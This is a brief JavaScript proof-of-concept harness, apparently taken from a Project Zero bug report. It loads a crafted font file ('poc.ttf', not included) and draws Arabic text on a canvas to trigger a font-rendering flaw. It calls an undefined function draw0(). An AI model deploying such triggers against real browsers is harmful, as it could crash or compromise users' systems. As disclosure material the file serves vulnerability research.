// https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=474948
function pig() {
    var ctx = canvas.getContext('2d');
    ctx.font = '24px GeezaPro';
    ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
}

function draw() {
    const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)");

    var canvas = document.getElementById('canvas')
    canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")

    pocFontFace.load().then(function(pocFontFaceLoaded) {
        document.fonts.add(pocFontFaceLoaded)
        document.fonts.ready.then(function() {
            draw0()
        })
    })
}

draw()